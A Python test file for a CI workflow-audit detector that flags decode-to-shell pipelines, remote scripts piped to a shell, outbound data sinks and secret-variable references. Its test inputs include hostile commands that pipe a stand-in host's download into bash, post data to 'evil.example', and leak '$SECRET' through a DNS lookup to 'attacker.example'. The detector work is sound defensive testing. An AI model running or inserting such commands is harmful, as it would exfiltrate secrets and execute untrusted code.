# tests/test_workflow_shellutil.py
from credence.workflow_audit.shellutil import (
    has_decode_to_shell, remote_pipe_to_shell, outbound_sinks, references_vars,
)


def test_decode_to_shell_variants():
    assert has_decode_to_shell("echo x | base64 -d | bash")
    assert has_decode_to_shell('eval "$(echo x | base64 --decode)"')
    assert has_decode_to_shell("python3 -c \"$(echo x | base64 -d)\"")
    assert has_decode_to_shell("echo x | gunzip | sh")


def test_decode_to_shell_negative():
    assert not has_decode_to_shell("base64 -d file > out.txt")  # decode, no shell
    assert not has_decode_to_shell("echo hello world")


def test_remote_pipe_to_shell():
    assert remote_pipe_to_shell("curl https://get.docker.com | sh") == "get.docker.com"
    assert remote_pipe_to_shell("wget -qO- https://evil.example/x | bash") == "evil.example"
    assert remote_pipe_to_shell("curl https://x.example -o f") is None  # not piped to shell


def test_outbound_sinks_classifies():
    sinks = outbound_sinks("curl -d @- https://evil.example/collect")
    assert any(s["host"] == "evil.example" and not s["dns"] for s in sinks)

    dyn = outbound_sinks("curl -d x $TARGET")
    assert any(s["dynamic"] for s in dyn)

    dns = outbound_sinks("nslookup $SECRET.attacker.example")
    assert any(s["dns"] for s in dns)


def test_references_vars():
    assert references_vars('curl -d "$TOKEN" x', {"TOKEN"})
    assert references_vars("echo ${TOKEN}", {"TOKEN"})
    assert not references_vars("echo hello", {"TOKEN"})
